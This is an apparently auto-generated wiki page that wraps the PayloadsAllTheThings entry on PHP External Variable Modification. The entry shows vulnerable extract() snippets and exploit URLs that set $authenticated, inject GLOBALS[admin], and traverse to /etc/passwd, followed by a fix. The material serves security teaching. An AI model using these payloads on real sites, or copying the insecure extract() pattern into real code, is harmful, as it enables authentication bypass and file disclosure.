---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# External Variable Modification

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-external-variable-modification-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/External Variable Modification/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [External Variable Modification](../../topics/external-variable-modification/external-variable-modification.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-external-variable-modification-readme |
| name | External Variable Modification |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/External%20Variable%20Modification/README.md |

## Preserved Source Material

````yaml
_body: "# External Variable Modification\n\n> External Variable Modification Vulnerability occurs when a web application improperly\
  \ handles user input, allowing attackers to overwrite internal variables. In PHP, functions like extract($_GET), extract($_POST),\
  \ or import_request_variables() can be abused if they import user-controlled data into the global scope without proper validation.\
  \ This can lead to security issues such as unauthorized changes to application logic, privilege escalation, or bypassing\
  \ security controls.\n\n## Summary\n\n* [Methodology](#methodology)\n    * [Overwriting Critical Variables](#overwriting-critical-variables)\n\
  \    * [Poisoning File Inclusion](#poisoning-file-inclusion)\n    * [Global Variable Injection](#global-variable-injection)\n\
  * [Remediations](#remediations)\n* [References](#references)\n\n## Methodology\n\nThe `extract()` function in PHP imports\
  \ variables from an array into the current symbol table. While it may seem convenient, it can introduce serious security\
  \ risks, especially when handling user-supplied data.\n\n* It allows overwriting existing variables.\n* It can lead to **variable\
  \ pollution**, impacting security mechanisms.\n* It can be used as a **gadget** to trigger other vulnerabilities like Remote\
  \ Code Execution (RCE) and Local File Inclusion (LFI).\n\nBy default, `extract()` uses `EXTR_OVERWRITE`, meaning it **replaces\
  \ existing variables** if they share the same name as keys in the input array.\n\n### Overwriting Critical Variables\n\n\
  If `extract()` is used in a script that relies on specific variables, an attacker can manipulate them.\n\n```php\n<?php\n\
  \    $authenticated = false;\n    extract($_GET);\n    if ($authenticated) {\n        echo \"Access granted!\";\n    } else\
  \ {\n        echo \"Access denied!\";\n    }\n?>\n```\n\n**Exploitation:**\n\nIn this example, the use of `extract($_GET)`\
  \ allow an attacker to set the `$authenticated` variable to `true`:\n\n```ps1\nhttp://example.com/vuln.php?authenticated=true\n\
  http://example.com/vuln.php?authenticated=1\n```\n\n### Poisoning File Inclusion\n\nIf `extract()` is combined with file\
  \ inclusion, attackers can control file paths.\n\n```php\n<?php\n    $page = \"config.php\";\n    extract($_GET);\n    include\
  \ \"$page\";\n?>\n```\n\n**Exploitation:**\n\n```ps1\nhttp://example.com/vuln.php?page=../../etc/passwd\n```\n\n### Global\
  \ Variable Injection\n\n:warning: As of PHP 8.1.0, write access to the entire `$GLOBALS` array is no longer supported.\n\
  \nOverwriting `$GLOBALS` when an application calls `extract` function on untrusted value:\n\n```php\nextract($_GET);\n```\n\
  \nAn attacker can manipulate **global variables**:\n\n```ps1\nhttp://example.com/vuln.php?GLOBALS[admin]=1\n```\n\n## Remediations\n\
  \nUse `EXTR_SKIP` to prevent overwriting:\n\n```php\nextract($_GET, EXTR_SKIP);\n```\n\n## References\n\n* [CWE-473: PHP\
  \ External Variable Modification - Common Weakness Enumeration - November 19, 2024](https://web.archive.org/web/20260210044429/https://cwe.mitre.org/data/definitions/473.html)\n\
  * [CWE-621: Variable Extraction Error - Common Weakness Enumeration - November 19, 2024](https://web.archive.org/web/20260223131419/https://cwe.mitre.org/data/definitions/621.html)\n\
  * [Function extract - PHP Documentation - March 21, 2001](https://web.archive.org/web/20260210044429/https://www.php.net/manual/en/function.extract.php)\n\
  * [$GLOBALS variables - PHP Documentation - April 30, 2008](https://web.archive.org/web/20260307071107/https://www.php.net/manual/en/reserved.variables.globals.php)\n\
  * [The Ducks - HackThisSite - December 14, 2016](https://github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md)\n\
  * [Extracttheflag! - Orel / WindTeam - February 28, 2024](https://web.archive.org/web/20250709004721/https://ctftime.org/writeup/38076)"
_relative_path: External Variable Modification/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/External Variable Modification/README.md
````
